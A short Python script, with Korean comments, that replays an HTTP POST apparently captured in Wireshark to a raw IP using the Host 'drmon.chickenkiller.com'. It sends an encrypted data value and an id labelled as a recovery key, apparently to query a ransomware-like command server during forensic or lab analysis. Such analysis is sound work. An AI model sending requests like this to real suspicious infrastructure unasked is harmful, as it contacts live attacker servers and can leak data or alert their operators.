import requests
import json

url = "http://182.228.44.206/"   # Wireshark에서 확인된 Host + Path
headers = {
    "Host": "drmon.chickenkiller.com",  # 패킷에 나온 Host 헤더
    "User-Agent": "Go-http-client/1.1",
    "Content-Type": "application/json",
    "Accept-Encoding": "gzip",
}

data = {
    "enc_data": "c33a04e9f32a30750594f6fcf3a8f60a8dfd3e06fb41c7e3561ddfcf01fa81f5",  # 실제 패킷에서 추출한 값 전체 넣기
    "id": "f5c92546-2fe9-456a-ada3-6ec1ea714928"  # Recovery Key
}

response = requests.post(url, headers=headers, data=json.dumps(data))

print("Status:", response.status_code)
print("Response:", response.text)